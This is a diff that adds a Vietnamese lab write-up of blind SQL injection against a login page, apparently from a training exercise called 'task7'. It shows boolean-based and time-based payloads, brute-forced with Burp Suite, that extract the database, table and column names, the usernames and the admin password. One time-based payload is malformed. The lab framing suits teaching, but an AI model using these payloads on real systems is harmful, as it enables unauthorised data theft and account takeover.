@@ -159,4 +159,77 @@ user:123
 pwd:202cb962ac59075b964b07152d234b70
 yeahhh!
 
+### boolean:
+bước đầu tiên kiểm tra độ dài của database, dùng payload:
+`' or 1=1 and length(database())= 1 -- `
+nếu đúng độ dài của database thì chúng ta sẽ đăng nhập vào được.
+![](https://i.imgur.com/Pjs5oaL.png)
+chưa thông báo đăng nhập thành công vậy chúng ta chạy burp tìm độ dài đúng. chạy burpsuite với từ khóa là `dang nhap thanh cong` tìm được độ dài của database là 5
+giờ sử dụng burpsuite, burteforce tìm tên của database() payload: kí tự thứ b là a nếu đúng thì sẽ đăng nhập vào được
+`' or 1=1 and substring(database(),b,1)='a' -- `
+![](https://i.imgur.com/v1MPMIC.png)
+vậy tên database là task7
+rồi đi tìm độ dài và tên bảng với payload: i là số kí tự của bảng
+`1' or (SELECT length(table_name) FROM information_schema.tables WHERE table_schema = 'task7')=i  -- -`
+![](https://i.imgur.com/mKs5EE8.png)
+vậy trong task7 có một bảng duy nhất với độ dài 4 kí tự. 
+dùng substring để tìm tên của bảng đó. với kí tự j ở vị trí thứ i
+`' or substring((SELECT table_name FROM information_schema.tables WHERE table_schema = 'task7'),i,1)='j'; -- -`
+ ![](https://i.imgur.com/ghlbtvq.png)
+được tên bảng là user
+bắt đầu tìm tên cột
+`1' or (SELECT length(column_name) FROM information_schema.columns WHERE table_name = 'user')=i  -- -`
+![](https://i.imgur.com/wUcORWf.png)
+lỗi này do có nhiều hơn 1 cột, vậy chúng ta sẽ tìm từng cột một xem có bao nhiêu cột.
+`1' or (SELECT length(column_name) FROM information_schema.columns WHERE table_name = 'user' and TABLE_schema='task7' limit 0,1)=i  -- -`
+![](https://i.imgur.com/ueJTi7S.png)
+vậy là có 3 bảng với độ dài lần lượt là 2-8-8
+`' or (case when substr((SELECT column_name FROM information_schema.columns WHERE table_name='user' and table_schema = 'task7' limit 0,1),1,1)='a' then 1 else 0 end) =1 -- `
+bảng 1 là limit 0,1
+bảng 2 là limit 1,1
+bảng 3 là limit 2,1
+![](https://i.imgur.com/woLa6aM.png)
+vậy là tìm được 3 bảng là: id, username, password
+cuối cùng là khai thác dữ liệu trong bảng thôi.
+`' OR (case when substr((select username from user limit 0,1),1,1)='0' then 1 else 0 end)=1 -- `
+![](https://i.imgur.com/wrf6c4o.png)
+vậy là ta thu được 3 user là: admin, test1, 123 
+giờ tìm kiếm mật khẩu của mỗi tài khoản thôi:
+`' OR (case when substr((select password from user where username='admin'),1,1)='0' then 1 else 0 end)=1 -- `
+![](https://i.imgur.com/ws2R6pR.png)
+![](https://i.imgur.com/uq0E8ra.png)
+![](https://i.imgur.com/ntoXMl2.png)
+
+và đó là cách chúng ta sử dụng burpsuite và boolean để thực hiện truy xuất dữ liệu một database bị rò rỉ.
+
+### time_base
+cũng giống như bool lean nhưng lần này chúng ta sẽ cho mọi giá trị nếu sai thì sẽ trả về 1=1 còn đúng thì chúng ta cho delay thời gian trả về. từ đó chúng ta có thể nhận thấy sự khác nhau giữa các giá trị khác nhau. 
+đầu tiên bắt đầu với việc chạy thử payload:`a' or sleep(2); -- `
+![](https://i.imgur.com/9izkM8U.png)
+sau đó rất lâu web mới trả về, đó là dấu hiệu nhận biết được rằng có thể thực hiện time_base.
+bước 1 vẫn là xác định tên của database:
+`' or (case when substring((select database() limit 0,1),§1§,1)='§a§' then sleep(1) else 1 end)=1 -- `
+
+![](https://i.imgur.com/3VWku5t.png)
+ vậy là ta được tên database là task7
+ 
+ tiếp theo là tìm tên bảng.
+ `' or substring((SELECT table_name FROM information_schema.tables WHERE table_schema = 'task7' limit 0,1),§1§,1)='§a§' then sleep(1) else 1 end)=1 -- `
+ ![](https://i.imgur.com/vbgO0p9.png)
+vậy là ta ra một bảng duy nhất là user
+tiếp theo là đi tìm tên các cột trong bảng. 
+`' or (case when substr((SELECT column_name FROM information_schema.columns WHERE table_name='user' and table_schema = 'task7' limit §0§,1),§1§,1)='§a§' then sleep(1) else 1 end)=1 -- `
+![](https://i.imgur.com/T2yAk8L.png)
+tìm được 3 cột tên lần lượt là id, username, password.
+tiếp theo ta sẽ đi tìm trong tên user trong bảng. 
+`' OR (case when substr((select username from user limit §0§,1),§1§,1)='§a§' then sleep(1) else 1 end)=1 -- `
+![](https://i.imgur.com/b6ozlCw.png)
+tìm được 3 username là admin, test1, 123
+ta sẽ đi tìm mật khẩu ứng với user:'admin'
+`' OR (case when substr((select password from user where username='admin'),§1§,1)='§a§' then sleep(1) else 1 end)=1 -- `
+
+![](https://i.imgur.com/GkALkit.png)
+vậy là chúng ta đã lấy được password của admin. 
+các user khác làm tương tự admin.
+
 
